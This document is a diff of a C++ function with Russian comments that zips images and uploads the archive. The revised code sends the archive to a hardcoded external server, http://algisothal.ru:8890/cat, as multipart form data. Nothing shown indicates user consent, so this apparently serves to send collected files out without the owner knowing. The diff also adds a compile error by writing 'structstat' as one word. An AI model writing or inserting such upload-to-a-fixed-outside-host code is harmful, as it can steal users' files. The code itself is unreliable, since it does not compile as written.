@@ -78,31 +78,55 @@ void CreateZipArchive(const std::vector<std::string>& images) {
 }
 
 // Функция для загрузки ZIP-архива по POST
-bool postZipArchive(const std::string& zipFileName) {
+bool postZipArchive(const std::string& zipFilePath) {
     CURL* curl;
     CURLcode res;
     FILE* hd_src;
-    struct stat file_info;
+    structstat file_info;
 
-    stat(zipFileName.c_str(), &file_info);
-    hd_src = fopen(zipFileName.c_str(), "rb");
-    
+    // Проверяем существование файла
+    if (stat(zipFilePath.c_str(), &file_info) != 0) {
+        std::cerr << "Не удалось получить информацию о файле: " << zipFilePath << std::endl;
+        return false;
+    }
+
+    // Открываем файл для чтения
+    hd_src = fopen(zipFilePath.c_str(), "rb");
+    if (!hd_src) {
+        std::cerr << "Не удалось открыть файл: " << zipFilePath << std::endl;
+        return false;
+    }
+
+    // Инициализация cURL
     curl_global_init(CURL_GLOBAL_DEFAULT);
     curl = curl_easy_init();
     if(curl) {
-        curl_easy_setopt(curl, CURLOPT_URL, UPLOAD_URL.c_str());
-        curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
-        curl_easy_setopt(curl, CURLOPT_READDATA, hd_src);
-        curl_easy_setopt(curl, CURLOPT_INFILESIZE_LARGE, (curl_off_t)file_info.st_size);
+        curl_easy_setopt(curl, CURLOPT_URL, "http://algisothal.ru:8890/cat");
         
+        // Настраиваем CURL для отправки файла как multipart/form-data
+        curl_mime* mime;
+        curl_mimepart* part;
+
+        mime = curl_mime_init(curl);
+        part = curl_mime_addpart(mime);
+        curl_mime_name(part, "file");
+        curl_mime_filedata(part, zipFilePath.c_str());
+
+        curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
+
+        // Выполняем запрос
         res = curl_easy_perform(curl);
         if(res != CURLE_OK) {
             std::cerr << "Ошибка при отправке архива: " << curl_easy_strerror(res) << std::endl;
         }
+
+        // Освобождаем ресурсы
+        curl_mime_free(mime);
         fclose(hd_src);
         curl_easy_cleanup(curl);
     }
     curl_global_cleanup();
+
     return true;
 }
 
